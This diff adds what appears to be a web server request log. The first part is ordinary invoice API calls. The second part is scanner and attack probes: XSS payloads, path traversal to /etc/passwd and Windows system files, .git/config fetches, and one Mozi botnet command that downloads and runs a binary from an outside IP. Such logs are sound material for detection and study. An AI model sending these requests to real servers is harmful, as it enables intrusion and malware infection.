@@ -1,0 +1,387 @@
+GET /api/purchase-invoice/1801442 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=1015857 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=790499 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=233989 HTTP/1.1
+POST /api/publicApi/sales-invoice/ubl?requestId=005103f1-a040-4640-9f55-b4fcd6c506a4&sendToCir=No HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=494409 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1747434 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1747523 HTTP/1.1
+GET /api/purchase-invoice/download?invoiceIds%5B0%5D=1783425 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=990225 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745008 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=234471 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=234560 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745097 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1967038 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=280742 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=985846 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1740663 HTTP/1.1
+GET /api/purchase-invoice/download?invoiceIds%5B0%5D=1778773 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=450217 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=233805 HTTP/1.1
+GET /static/js/32.7c0188d7.chunk.js HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=476097 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=452376 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=277369 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1747240 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=570717 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=517889 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1744635 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=979030 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1744724 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=200671 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=276196 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1744546 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=937209 HTTP/1.1
+POST /api/publicApi/sales-invoice/ubl?requestId=02097e06-38d8-43cf-8492-44d07dac00b0&sendToCir=No HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=936925 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1742114 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=263202 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=861593 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1746267 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=500399 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=970950 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1744540 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1746445 HTTP/1.1
+POST /api/publicApi/purchase-invoice/changes?date=2022-07-31T01:58:00.001745600+02:00 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=504711 HTTP/1.1
+GET /api/publicApi/sales-invoice?requestId=c322d5ef8120486094cbbb1297c7e1e9?sendToCir=Auto&invoiceId=184723 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1742298 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=2080344 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=970245 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=936912 HTTP/1.1
+POST /api/publicApi/sales-invoice/ubl?requestId=0d583469-3b95-45c4-99c2-aef287561015&sendToCir=No HTTP/1.1
+GET /api/publicApi/purchase-invoice?requestId=b1b0645f909f49d8b833745cb0cade0f?sendToCir=Auto&invoiceId=159463 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745637 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=195946 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745548 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=169074 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=2024485 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=487855 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=986743 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=551993 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1748248 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=832737 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=1224109 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1748337 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1746521 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=519502 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1746610 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=516163 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745443 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=952434 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=477571 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=537264 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=438629 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=470890 HTTP/1.1
+POST /api/publicApi/subscribe HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1746520 HTTP/1.1
+POST /api/publicApi/sales-invoice/ubl?requestId=3d4a95ed-fe21-426d-8450-2a97f7319264&sendToCir=No HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1744648 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=550023 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=936877 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=789543 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=807352 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=450449 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=999451 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=937721 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=987860 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=937463 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=961324 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=951045 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=1006020 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=937558 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=493134 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=512201 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=934549 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=233531 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=937066 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745676 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1746357 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=928220 HTTP/1.1
+GET /api/publicApi/purchase-invoice/xml?invoiceId=1773933 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=495839 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=233626 HTTP/1.1
+GET /api/publicApi/purchase-invoice?requestId=4698f70a29bc400fb1f08d78d9254b57?sendToCir=Auto&invoiceId=168864 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=502721 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1742475 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=450796 HTTP/1.1
+GET /api/publicApi/sales-invoice/xml?invoiceId=163568 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=521172 HTTP/1.1
+GET /api/purchase-invoice/download?invoiceIds=1270256&language=sr_SL HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=477269 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=234396 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1744491 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=937468 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=506692 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=932376 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=233368 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=2026159 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=2039859 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=1012656 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1744738 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=937414 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1747201 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=21401 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1747241 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745636 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=496737 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745369 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745082 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=1008328 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=488174 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=411939 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=406385 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=475997 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1746317 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=235110 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=472716 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=233621 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=502017 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=938069 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=450489 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=453595 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=267089 HTTP/1.1
+GET /api/publicApi/sales-invoice/xml?invoiceId=170606 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=523782 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=500700 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=480827 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=997615 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=936837 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=461886 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=285434 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=479839 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=234614 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=233675 HTTP/1.1
+POST /api/publicApi/sales-invoice/ubl?requestId=cb2a4805-7235-4882-8c1c-464f86b16b24&sendToCir=No HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1746227 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=2024690 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=511884 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=233933 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1744901 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=487583 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=505971 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=525763 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1740856 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745130 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=997927 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=985702 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=937324 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1748421 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=925163 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=937775 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1747692 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=948017 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=475813 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=940754 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=2081461 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=234356 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=468428 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1749544 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=1010006 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1746253 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1746719 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1747835 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=983459 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745042 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1747657 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745220 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1748516 HTTP/1.1
+GET /api/publicApi/sales-invoice/xml?invoiceId=170681 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=487815 HTTP/1.1
+GET /api/publicApi/sales-invoice?requestId=e7d797eea0ed4fe8a433d5099ab407ef?sendToCir=Auto&invoiceId=207521 HTTP/1.1
+POST /api/publicApi/sales-invoice/ubl?requestId=502b17f1-8db2-4889-8d26-713d208285c6&sendToCir=Yes HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=466536 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745225 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1747747 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=2095499 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=932206 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=505807 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=1009672 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=983186 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745499 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745943 HTTP/1.1
+GET /static/media/icon-card-vat-records.92c52c0a.svg HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=233661 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=500165 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745315 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=827416 HTTP/1.1
+GET /api/publicApi/sales-invoice/xml?invoiceId=170598 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745137 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=947078 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=233264 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1746624 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=943271 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1744941 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=500255 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=937735 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=1014810 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=487841 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=516253 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1746650 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=461072 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745622 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=271103 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=516075 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=937913 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=790354 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=940844 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745047 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=234663 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1747433 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=950350 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=939008 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=466973 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1745444 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=987820 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1747830 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=947590 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=948423 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1917625 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=945440 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1746971 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=937017 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=1729355 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=590428 HTTP/1.1
+POST /api/publicApi/purchase-invoice/changes?date=2022-07-31T01:56:00.001448500+02:00 HTTP/1.1
+GET /api/publicApi/purchase-invoice?invoiceId=457428 HTTP/1.1
+GET /api/publicApi/sales-invoice?invoiceId=937865 HTTP/1.1
+GET /cgi-bin/$%7B%28%22QualysQID%22+%2213251%22%29%7D/redirect.xhtml
+TRACK /
+GET /messagebroker/httpsecure
+GET /v1/management/tenant/getSpeedDomain
+GET /images/icons/list_pages_faded_16.gif
+GET /tiki-edit_wiki_section.php?type=%22%3E%3Cscript%3Ealert("QUALYSXSS")%3C/script%3E
+GET /ui
+GET /shop/
+POST /?0x[]=[androxgh0st]
+GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://182.113.52.110:53970/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron
+GET /browse.asp
+GET /drupal-7.31/
+GET /%22%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E.exe
+GET /DotNetNuke/
+GET /gallery-1.2.1/
+GET /api/serverEnv
+GET /nx/
+POST /console/css/%252E%252E%252Fconsole.portal
+GET /pafiledb.php?action=rate&id=1[Qualys]&rate=dorate&rating=10
+GET /yapig/
+GET /app/.git/config
+GET /htmlscript?../../../../../../boot.ini
+GET /content/administrator/components/com_komento/
+GET /SugarCE/
+GET /pphlogger/
+GET /index.php3
+GET /index.php?target=db_sql.php%253f/../../../../../../windows/win.ini
+GET /cot/
+GET /html-edit/
+GET /phprojekt-3.1a/options/
+ABCD /
+GET /jkstatus
+GET /Public/initJs.php
+GET /launch.asp?NFUSE_USER=admin&NFUSE_PASSWORD=admin&NFuse_Application=<script>alert(5311)</script>
+GET /WEB-INF./jrun-web.xml
+GET /mailobj1.nsf
+GET /libraries/htmleditor/
+GET /cgi-bin/admin.php?admin=1
+GET /struts2/
+GET /gfx/no_preview/extension/iff_col.png
+GET /images/menubar/suppliers.png
+GET /product/1
+GET /2kzL9Tg3.php?/etc/passwd
+GET /Recruit/download_url
+GET /themes/Bluey/percent-50.png
+GET /faqmanager.cgi?toc=faqmanager.cgi%00
+GET http://host64.ru/rb/getip.php?Z72136199653Q1
+GET /myphpcalendar/
+GET /events4.nsf
+GET /YaBB.cgi?board=news;action=display;num=<script>alert(document.domain)</script>
+GET /index.php?act=members&username=\
+GET /show_bug.cgi
+GET /cards/
+GET /cgi/get.cgi?cmd=home_login&dummy=1613409696366&bj4=c6c6438ac06d2c69c5ef76dffe44823a
+GET /cgi-bin/texis.exe?-dump
+GET /chl.css
+GET /2015/users/6/credit_cards
+GET /typo3/typo3/gfx/closedok.gif
+GET /sgdynamo.exe?HTNAME=<script>alert(3218)</script>
+GET /l-forum/
+GET /2014/users/1/shipping_addresses
+GET /invboard/
+GET /themes/HumHub/font/open_sans/open-sans.css
+OPTIONS /cgi-bin/index.php
+GET /2014/admin
+GET /phpnuke-5.0.1/
+GET /base/webmail/
+GET /wp-content/plugins/wp-restful/html_api_login.php?oauth_token_temp=%22%3E%3Cscript%3Ealert(%22QualysXSSTest%22)%3C/script%3E
+GET /views/commData/commonSite.js
+GET /EspoCRM/
+GET /admin/phpinfo.php?variable=<script>alert('QualysXSS');</script>
+GET /cgi-bin/a1disp3.cgi?../../../../../../../etc/passwd
+GET /phpnuke/html/admin.php?upload=1&file=config.php&file_name=hacked.html&wdir=/images/&userfile=config.php&userfile_name=hacked.html
+GET /insert.inc.php
+GET /2014/users/3/credit_cards
+GET /cgi-bin/_async/AsyncResponseService
+GET /HNAP1/
+GET /moin_static160rc2/rightsidebar/css/print.css
+GET /administrator/manifests/files/joomla.xml
+GET /php.php
+GET /mnogosearch/
+GET /menu.cgi
+GET /api/home/index
+GET /moin_static184/modern/css/msie.css
+GET /bea_wls_internal/classes/weblogic/common/internal/VersionInfoFactory$VERSION_INFO_SINGLETON.class
+GET /pollit/
+GET /phpmyadmin/sql.php3
+POST /2014/guestbook_entries
+GET /Administrator/
+GET /NFuse151/
+GET https://cert.rs/mailto:+this.dataset.name+@+this.dataset.domain+.+this.dataset.tld%3E%3C/a%3E%3C/li%3E%3Cli%3E%3Cahref=/files/shares/pgp-public.txt%3E%D0%9F%D1%80%D0%B5%D1%83%D0%B7%D0%B8%D0%BC%D0%B0%D1%9A%D0%B5%D0%9F%D0%93%D0%9F%D0%BA%D1%99%D1%83%D1%87%D0%B5%D0%B2%D0%B0%3C/a%3E%3C/li%3E%3Cli%3E%3Cahref=/stranica/56-Uslovi+koriscenja+i+Politika+privatnosti.html%3E%D0%A3%D1%81%D0%BB%D0%BE%D0%B2%D0%B8%D0%BA%D0%BE%D1%80%D0%B8%D1%88%D1%9B%D0%B5%D1%9A%D0%B0%D0%B8%D0%BF%D0%BE%D0%BB%D0%B8%D1%82%D0%B8%D0%BA%D0%B0%D0%BF%D1%80%D0%B8%D0%B2%D0%B0%D1%82%D0%BD%D0%BE%D1%81%D1%82%D0%B8%3C/a%3E%3C/li%3E%3Cli%3E%3Cahref=/stranica/194-Kontakt+telefon.html%3E%D0%9A%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D1%82%D0%B5%D0%BB%D0%B5%D1%84%D0%BE%D0%BD%3C/a%3E%3C/li%3E%3C/ul%3E%3C/div%3E%3C/div%3E%3Cdivclass=col-md-3col-sm-6col-xs-6%3E%3Cdivclass=widget%3E%3Cimgclass=img-responsivesrc=/assets/public/images/ratel-logo-sr-horizontalni.png%3E%3Cp%3E%D0%A0%D0%B5%D0%B3%D1%83%D0%BB%D0%B0%D1%82%D0%BE%D1%80%D0%BD%D0%B0%D0%B0%D0%B3%D0%B5%D0%BD%D1%86%D0%B8%D1%98%D0%B0%D0%B7%D0%B0%D0%B5%D0%BB%D0%B5%D0%BA%D1%82%D1%80%D0%BE%D0%BD%D1%81%D0%BA%D0%B5%D0%BA%D0%BE%D0%BC%D1%83%D0%BD%D0%B8%D0%BA%D0%B0%D1%86%D0%B8%D1%98%D0%B5%D0%B8%D0%BF%D0%BE%D1%88%D1%82%D0%B0%D0%BD%D1%81%D0%BA%D0%B5%D1%83%D1%81%D0%BB%D1%83%D0%B3%D0%B5%3C/p%3E%3Cahref=http:/www.ratel.rs%3E%D0%94%D0%B5%D1%82%D0%B0%D1%99%D0%BD%D0%B8%D1%98%D0%B5%3C/a%3E%3C/div%3E%3C/div%3E%3C/div%3E%3C/div%3E%3C/div%3E%3Cdivclass=related-links%3E%3Cdivclass=container%3E%3Cdivclass=row%3E%3Cdivclass=col-md-12%3E%3Cp%3ECopyright&
+GET /exchweb/bin/auth/owalogon.asp
+GET /mppt/doc/admin/
+GET /search.asp
+GET /wamp/magento/skin/frontend/default/galatitanshop/css/less/
+GET /Content/administrator/components/com_acysms/
+GET /support/
+GET /wp-content/plugins/dm-albums/readme.txt
+GET /connexion.inc
+GET /cgi-local/
+GET /cgi-bin/story.pl?next=../../../../../etc/passwd%00
+GET /ReportServer
+GET /moin_static173/robots.txt
+GET /cgi-bin/pagelog.cgi
+GET /cgi-bin/MAILLIST.CGI
+GET /SimpleChat/
+GET /2014/products/21/reviews/new
+GET /cgi-bin/recipe_search.php?searchstring=<script>alert(document.domain);</script>
+GET /images/9_small.jpg
+GET /cgi-bin/sdbsearch_hu.cgi
+GET /new/.git
+GET /cgi-bin/auctionweaver.pl?flag1=1&catdir=cat2&fromfile=..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+GET /CrystalReportWebFormViewer/
+GET /SysPass/
+GET /en-US/account/login
+GET /images/spacer.gif
+GET /AmpJuke/
+GET /svn/
+GET /services/javascript.php
+GET /discuss/core/
+GET /$%7B%28%22QualysQID%22+%2213251%22%29%7D/index.jsp
+GET /PostNuke/
+GET /phppgadmin/sql.php
+GET /conf
+GET /phpayv22/
+GET /help/
+GET /Printers/
+GET /cgi-bin/gbrowse?help=../../../../../../../../../../../../../../../etc/passwd%00
+GET /cgi-bin/www-sql
+GET /Content/administrator/components/com_melody/
+GET /photoalbum/
+GET /moin_static181/classic/css/msie.css
+GET /theme/eldy/img/object_energie.png
+GET /cgi-bin/cal_make.pl?p0=../../../../../../../../../etc/passwd%00
+GET /decsadm.nsf
+GET /NFuse/
+GET /projects/
+GET /dist/images/mask/bg1.jpg
+GET /favicon.iso
